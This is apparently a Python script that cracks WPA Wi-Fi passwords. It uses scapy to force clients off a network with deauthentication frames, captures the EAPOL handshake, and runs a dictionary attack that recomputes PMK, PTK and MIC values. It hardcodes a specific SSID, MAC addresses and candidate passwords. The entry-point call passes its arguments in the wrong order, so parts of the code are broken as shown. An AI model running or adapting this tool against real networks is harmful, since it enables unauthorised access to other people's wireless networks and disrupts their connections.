
import hmac,hashlib,binascii
import scapy.all as scapy

class Crack:
    
    def to_mac(self, addr): return ':'.join(addr[i:i+2] for i in range(0,len(addr),2))
    def a2b(self, s): return binascii.a2b_hex(s);
    def b2a(self, by): return binascii.b2a_hex(by);

    def PRF(self, key, A, B):
            nByte = 64
            i = 0
            R = b''
            while(i <= ((nByte * 8 + 159) / 160)):
                hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
                R = R + hmacsha1.digest()
                i += 1
            return R[0:nByte]
    
    def run(self, interface, router, devices, spoofer, password_file):
        
        interface.monitor_mode()
        interface.set_channel(router.get_channel())

        
        packets = []
        num = 0
        while True:
            num = num + 1
            for device in devices:
                spoofer.deauthentication(router, device, num)
                scapy.sniff(filter='ether proto 0x888e', prn=lambda x: packets.append(x), iface=interface.get_name(), count=4, timeout = 5)
                if packets != []:
                    break
            if packets != []:
                    break
        
        #the_file = scapy.rdpcap("tmp.pcap")
        #for p in the_file:
        #    packets.append(p)
        

        p1 = scapy.bytes_hex(packets[0]).decode()
        p2 = scapy.bytes_hex(packets[1]).decode()

        SSID   = "BezeqNK"
        passwd   = "verint11"
        
        R1 = self.a2b(p1[162:226]) 
        R2 = self.a2b(p2[162:226]) 
        M1 = self.a2b(p1[80:92])
        M2 = self.a2b(p2[80:92]) 
        
        start = self.a2b(p2[128:290])
        end = self.a2b(p2[322:]) 
        
        with open(password_file) as f:
            for passwd in f:
                passwd = passwd[:-1]
                PMK = hashlib.pbkdf2_hmac('sha1', passwd.encode(), SSID.encode(), 4096, 32)  
                PTK = self.PRF(PMK,b"Pairwise key expansion",min(M1,M2)+max(M1,M2)+min(R1,R2)+max(R1,R2))
                KCK = PTK[0:16];

                
                MICRAW   = hmac.new(KCK,start+self.a2b("00000000000000000000000000000000")+end,hashlib.sha1)
                MICFOUND = p2[290:322] 
                MICCALC  = MICRAW.hexdigest()[0:32]
                
                if MICFOUND == MICCALC:
                    break

        print("SSID/PASS: ",SSID,"/",passwd)
        print("PMK:       ",self.b2a(PMK))
        print("AP-MAC:    ",self.b2a(M1))
        print("STA-MAC:   ",self.b2a(M2))
        print("AP-NONCE:  ",self.b2a(R1))
        print("STA-NONCE: ",self.b2a(R2))
        print("KCK:       ",self.b2a(KCK))
        print("MIC-found: ",MICFOUND)
        print("MIC-calc:  ",MICCALC)
        print("Result:    ",("OK: EAPoL message #2 validated" if MICFOUND==MICCALC else "ERROR: MIC does not match"))
        
        interface.managed_mode()
        
        return passwd

if __name__ == "__main__":
    crack = Crack()
    
    from interface import Interface
    from router import Router
    from device import Device
    from spoofer import Spoofer
    
    
    inter = Interface("wlan0")
    crack.run(inter, Router("14:ae:db:a3:22:95", 6, "BezeqNK"), ["verint","verint1!","verint11","verint!1","verint21"], [Device("be:39:2e:b1:eb:85")], Spoofer(inter))
